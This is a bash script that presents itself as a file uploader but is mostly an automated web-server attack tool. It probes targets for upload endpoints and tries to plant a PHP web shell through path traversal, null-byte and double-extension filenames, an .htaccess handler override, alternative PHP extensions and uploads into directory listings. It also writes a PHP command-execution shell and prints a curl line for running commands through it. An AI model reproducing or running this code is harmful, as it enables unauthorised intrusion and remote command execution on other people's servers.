#!/bin/bash
# auto_upload_with_exploit.sh

upload_file() {
    local file="$1"
    local server="$2"
    local exploit_mode="${3:-false}"
    
    # Get file info
    local filename=$(basename "$file")
    local hash=$(md5sum "$file" | awk '{print $1}')
    
    echo "Processing: $filename"
    
    # Step 1: Quick check by name
    echo -n "Checking if $filename exists... "
    if curl -k -s -f -I "$server/uploads/$filename" >/dev/null; then
        echo "YES"
        if [ "$exploit_mode" = "false" ]; then
            read -p "Overwrite? (y/N): " -n 1 -r
            echo
            [[ ! $REPLY =~ ^[Yy]$ ]] && return 1
        fi
    else
        echo "NO"
    fi
    
    # Step 2: Check by content hash
    echo -n "Checking if content exists... "
    local existing=$(curl -k -s "$server/api/find?hash=$hash")
    if [ "$existing" != "null" ] && [ -n "$existing" ]; then
        echo "YES"
        echo "File already exists at: $existing"
        return 0
    fi
    echo "NO"
    
    # Step 3: Upload
    echo "Uploading..."
    local response=$(curl -k -s -F "file=@$file" "$server/upload")
    
    if echo "$response" | grep -q "success"; then
        echo "✅ Upload successful!"
        echo "URL: $(echo "$response" | jq -r '.url')"
        return 0
    else
        echo "❌ Upload failed"
        return 1
    fi
}

# Exploitation functions
exploit_upload() {
    local server="$1"
    local payload_file="$2"
    
    echo "🔍 Starting exploitation against: $server"
    
    # Test 1: Try path traversal in upload endpoint
    echo "Testing path traversal..."
    local evil_name="../../../../var/www/html/backdoor.php"
    curl -k -s -F "file=@$payload_file" -F "filename=$evil_name" "$server/upload" > /dev/null
    
    # Test 2: Try null byte injection
    echo "Testing null byte injection..."
    curl -k -s -F "file=@$payload_file;filename=shell.php%00.jpg" "$server/upload" > /dev/null
    
    # Test 3: Try multiple extensions
    echo "Testing multiple extensions..."
    curl -k -s -F "file=@$payload_file;filename=test.php.jpg" "$server/upload" > /dev/null
    curl -k -s -F "file=@$payload_file;filename=test.php " "$server/upload" > /dev/null
    
    # Test 4: Try .htaccess bypass
    echo "Testing .htaccess bypass..."
    cat << 'EOF' > /tmp/.htaccess
AddType application/x-httpd-php .jpg
AddHandler php5-script .jpg
EOF
    curl -k -s -F "file=@/tmp/.htaccess" "$server/upload" > /dev/null
    curl -k -s -F "file=@$payload_file;filename=shell.jpg" "$server/upload" > /dev/null
    
    # Test 5: Try alternative PHP extensions
    echo "Testing alternative PHP extensions..."
    for ext in phtml php3 php4 php5 php6 phps pht; do
        curl -k -s -F "file=@$payload_file;filename=shell.$ext" "$server/upload" > /dev/null
    done
    
    # Test 6: Try case manipulation
    echo "Testing case manipulation..."
    for name in Shell.PHP SHELL.Php shell.PHp; do
        curl -k -s -F "file=@$payload_file;filename=$name" "$server/upload" > /dev/null
    done
}

# Auto-discover and exploit
auto_exploit() {
    local target="$1"
    local payload_file="$2"
    
    echo "🚀 Starting auto-exploitation..."
    
    # Try with/without https
    for protocol in "https" "http"; do
        local url="$protocol://$target"
        echo "Trying $url..."
        
        # Check if server is accessible
        if curl -k -s -f -I "$url" >/dev/null; then
            echo "✅ Server accessible at $url"
            
            # Test common upload paths
            declare -a upload_paths=(
                "/upload"
                "/admin/upload"
                "/api/upload"
                "/upload.php"
                "/admin/upload.php"
                "/file/upload"
                "/assets/upload"
                "/include/upload.php"
                "/upload/upload.php"
                "/upload/file"
                "/upload/upload"
                "/upload/do_upload"
                "/upload/upload_file"
                "/upload/upload-image"
                "/upload/upload-file"
            )
            
            for path in "${upload_paths[@]}"; do
                local upload_url="$url$path"
                echo "Testing $upload_url..."
                
                # Test if upload endpoint exists
                if curl -k -s -f -I "$upload_url" >/dev/null 2>&1 || \
                   curl -k -s -f -X POST "$upload_url" -F "test=test" >/dev/null 2>&1; then
                    echo "🎯 Found upload endpoint: $upload_url"
                    
                    # Try to exploit it
                    exploit_upload "$url" "$payload_file"
                    
                    # Verify exploitation
                    verify_exploitation "$url"
                fi
            done
            
            # Also try to find upload via directory listing
            find_upload_via_dirlisting "$url"
        fi
    done
}

find_upload_via_dirlisting() {
    local url="$1"
    
    echo "Searching for directory listings..."
    
    declare -a common_dirs=(
        "/uploads/"
        "/upload/"
        "/files/"
        "/assets/"
        "/images/"
        "/media/"
        "/data/"
        "/admin/uploads/"
        "/userfiles/"
        "/filemanager/"
        "/tinymce/"
        "/ckeditor/"
    )
    
    for dir in "${common_dirs[@]}"; do
        if curl -k -s "$url$dir" | grep -q "Index of\|Parent Directory"; then
            echo "📁 Found directory listing: $url$dir"
            
            # Try to upload directly to this directory
            for attempt in {1..5}; do
                local rand_name="shell_$RANDOM.php"
                echo "Attempting to upload to $url$dir$rand_name"
                curl -k -s -F "file=@$payload_file" "$url$dir$rand_name" > /dev/null
                
                # Check if file was created
                if curl -k -s -f "$url$dir$rand_name" >/dev/null; then
                    echo "✅ Success! Shell at: $url$dir$rand_name"
                    return 0
                fi
            done
        fi
    done
}

verify_exploitation() {
    local url="$1"
    
    echo "Verifying exploitation..."
    
    # Check common shell locations
    declare -a shell_locations=(
        "/uploads/shell.php"
        "/upload/shell.php"
        "/shell.php"
        "/backdoor.php"
        "/uploads/backdoor.php"
        "/upload/backdoor.php"
        "/uploads/shell.jpg"
        "/upload/shell.jpg"
        "/var/www/html/backdoor.php"
        "/uploads/test.php"
        "/upload/test.php"
    )
    
    for location in "${shell_locations[@]}"; do
        if curl -k -s -f "$url$location" | grep -q "PHP\|<?php"; then
            echo "🎉 Shell confirmed at: $url$location"
            echo "Access: curl -k '$url$location?cmd=whoami'"
            return 0
        fi
    done
    
    echo "No shells found automatically. Manual verification required."
}

# Main execution
if [ "$#" -lt 2 ]; then
    echo "Usage:"
    echo "  Normal upload: $0 <file> <server_url>"
    echo "  Exploit upload: $0 --exploit <server_url> <payload_file>"
    echo "  Auto exploit: $0 --auto <target_host> <payload_file>"
    echo ""
    echo "Example:"
    echo "  $0 malicious.php https://target.com"
    echo "  $0 --exploit https://target.com shell.php"
    echo "  $0 --auto target.com shell.php"
    exit 1
fi

# Create a simple PHP shell if needed
create_php_shell() {
    cat << 'EOF' > php_shell.php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
echo "PHP Shell";
?>
EOF
    echo "Created php_shell.php"
}

case "$1" in
    --exploit)
        if [ -z "$3" ]; then
            create_php_shell
            exploit_upload "$2" "php_shell.php"
        else
            exploit_upload "$2" "$3"
        fi
        ;;
    --auto)
        if [ -z "$3" ]; then
            create_php_shell
            auto_exploit "$2" "php_shell.php"
        else
            auto_exploit "$2" "$3"
        fi
        ;;
    *)
        if [ "$#" -eq 2 ]; then
            upload_file "$1" "$2"
        else
            echo "Invalid arguments"
            exit 1
        fi
        ;;
esac
